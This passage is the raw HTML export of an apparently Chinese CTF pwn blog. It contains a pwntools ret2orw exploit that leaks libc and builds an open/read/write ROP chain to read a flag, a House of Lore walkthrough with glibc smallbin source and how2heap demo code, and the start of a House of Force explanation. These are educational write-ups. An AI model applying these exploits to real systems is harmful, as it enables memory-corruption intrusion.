class="line">payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(op)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(bss+<span class="number">0x200</span>)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(bss+<span class="number">0x200</span>)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(write)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">dbg()</span><br><span class="line">p.sendlineafter(<span class="string">'Index: '</span>,p32(<span class="number">3</span>))</span><br><span class="line">payload=<span class="string">b'd'</span>*<span class="number">0xff</span>+p64(bss+<span class="number">0x200</span>-<span class="number">8</span>)+p64(leave)</span><br><span class="line">p.sendafter(<span class="string">'Note: '</span>,<span class="string">'g'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"><span class="comment">#leak_base</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>沙箱</title>
      <link href="//posts/fbdf783e/"/>
      <url>//posts/fbdf783e/</url>
      
        <content type="html"><![CDATA[<p> 目前对沙箱类型的题写一下，这块比较薄弱</p><p>最常见的就是ret2syscall了，一般开了沙箱，只能用orw</p><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>一般开了，禁用了execve,只能用orw读出flag</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241116200238975.png" alt="image-20241116200238975"></p><p>来看下常用的几个函数，当把bin/sh或./flag读入bss时，read（0，bss,nb)，rdi=0，rsi=bss,rsi=nb;</p><p>然后时open函数,open(‘flag’),    rdi=flag_addr(bss),rsi=0;</p><p>读进bss+0x300,read(3,bss+0x300,nb),rdi=3,rsi=bss+0x300,rsi=nb;</p><p>读出flag ，write(1,bss+0x300,nb), rdi=1,rsi=bss+0x300,rsi=nb;</p><h5 id="遇过一次坑就是，当把flag字符写进bss时，字符串应该时p-sendline-‘-flag-x00’-后面必须是空格，否则open函数是以加了-n来找flag文件，是找不到的，所以得加空格"><a href="#遇过一次坑就是，当把flag字符写进bss时，字符串应该时p-sendline-‘-flag-x00’-后面必须是空格，否则open函数是以加了-n来找flag文件，是找不到的，所以得加空格" class="headerlink" title="遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\x00’),后面必须是空格，否则open函数是以加了\n来找flag文件，是找不到的，所以得加空格"></a>遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\x00’),后面必须是空格，否则open函数是以加了\n来找flag文件，是找不到的，所以得加空格</h5><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241116201052197.png" alt="image-20241116201052197"></p><p>常用的exp</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("27.25.151.12",33424)</span></span><br><span class="line">p=process(<span class="string">"./ret2orw"</span>)</span><br><span class="line">elf=ELF(<span class="string">'ret2orw'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x4012CE</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(<span class="number">0x4012A1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'this?'</span>,payload)</span><br><span class="line">puts=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line">base=puts-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">pop_rsi=base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx=base+<span class="number">0x11f497</span></span><br><span class="line">bss=<span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">read=base+libc.sym[<span class="string">'read'</span>]</span><br><span class="line">write=base+libc.sym[<span class="string">'write'</span>]</span><br><span class="line">op=base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'read'</span>+<span class="built_in">hex</span>(read))</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read)+p64(<span class="number">0x4012A1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'./flag'</span>)</span><br><span class="line">dbg()</span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(op)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(bss+<span class="number">0x300</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(<span class="number">0</span>)+p64(read)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(bss+<span class="number">0x300</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(<span class="number">0</span>)+p64(write)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'pop_rsi'</span>+<span class="built_in">hex</span>(pop_rsi))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="//posts/0/"/>
      <url>//posts/0/</url>
      
        <content type="html"><![CDATA[<hr><h5 id="title-house-of-lore"><a href="#title-house-of-lore" class="headerlink" title="title:house-of-lore"></a>title:house-of-lore</h5><p>date:2024-11-04 22:55:22</p><h2 id="tags-how2heap"><a href="#tags-how2heap" class="headerlink" title="tags:#how2heap"></a>tags:#how2heap</h2><p>victim = last(bin)，其实就是victim=bin-&gt;bk</p><p>利用条件，能更改victim的bk指针，且能构造两个fakechunk,第二fakechunk的bk指针不做要求</p><p>前期在栈上构造的fakechunk是这样</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241105174649218.png" alt="image-20241105174649218"></p><p>要想把bin-&gt;bk=stack_buffer_1,这里有个check，<strong>(__glibc_unlikely(bck-&gt;fd != victim))</strong> </p><p>这里倒数第一个chunk其实指的是第一个释放的chunk，即victim=bin-&gt;bk</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//victim是第一个释放的</span></span><br><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) {</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            <span class="built_in">set_inuse_bit_at_offset</span>(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241105180225861.png" alt="image-20241105180225861"></p><p>申请一个同大小堆后</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241105182629901.png" alt="image-20241105182629901"></p><p>再申请就能申请到栈上的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241105183054172.png" alt="image-20241105183054172"></p><p><strong>很明显要改到栈上的地址，至少得构造两个fakechunk,因为申请到第一个fakechunk时会检查第二个fakechunk的fd指针</strong>，<strong>攻击手法和unsortedbin attack有点点相似，区别在于unsortedbin attack只能改(bck=victim-&gt;bk)的fd值为main_arena+88而已</strong></p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) {</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) {</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) {</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            <span class="comment">// 细致的检查</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">            <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>{ <span class="built_in">puts</span>(<span class="string">"Nice jump d00d"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); }</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = {<span class="number">0</span>};</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>200~house_of_force</title>
      <link href="//posts/a8db7475/"/>
      <url>//posts/a8db7475/</url>
      
        <content type="html"><![CDATA[<p>利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8）</p><p>结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">{</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    #设置top_chunk的头，附近值会有所变化</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以把size改为-1，在补码中为很大的数，能够满足条件</p><h5 id="新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移"><a href="#新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移" class="headerlink" title="新的remainder即top_chunk的地址  **remainder = chunk_at_offset(victim, nb);**，需要算出topchunk的地址和目标地址的偏移"></a>新的remainder即top_chunk的地址  <code>**remainder = chunk_at_offset(victim, nb);**</code>，需要算出topchunk的地址和目标地址的偏移</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>对申请的size的检查</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span 